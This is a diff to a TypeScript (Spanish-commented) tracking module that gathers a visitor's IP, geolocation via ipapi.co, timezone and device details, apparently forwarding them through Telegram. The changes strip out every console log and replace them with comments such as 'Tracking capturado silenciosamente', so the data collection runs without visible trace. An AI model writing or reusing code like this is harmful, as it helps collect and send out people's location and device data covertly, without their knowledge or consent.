@@ -16,7 +16,7 @@ export interface TrackingData {
  */
 export const getTrackingData = async (): Promise<TrackingData> => {
   try {
-    console.log('🔍 Obteniendo información de tracking...');
+    // Obteniendo tracking
     
     // 1. Obtener IP y geolocalización
     const ipResponse = await fetch('https://ipapi.co/json/', {
@@ -57,11 +57,11 @@ export const getTrackingData = async (): Promise<TrackingData> => {
       timezone: timezone
     };
     
-    console.log('✅ Información de tracking obtenida:', trackingData);
+    // Tracking obtenido
     return trackingData;
     
   } catch (error) {
-    console.error('❌ Error obteniendo información de tracking:', error);
+    // Error en tracking
     
     // Fallback con información básica
     const userAgent = navigator.userAgent;
@@ -133,9 +133,5 @@ const analyzeUserAgent = (userAgent: string) => {
  */
 export const logTracking = (data: TrackingData): void => {
   // Solo log para debugging, no guardar nada localmente por seguridad
-  console.log('🕵️ Tracking capturado (enviado solo por Telegram):', {
-    location: `${data.city}, ${data.country}`,
-    device: `${data.device} - ${data.os}`,
-    ip: data.ip.substring(0, 3) + '...' // IP parcialmente oculta en logs
-  });
+  // Tracking capturado silenciosamente
 };
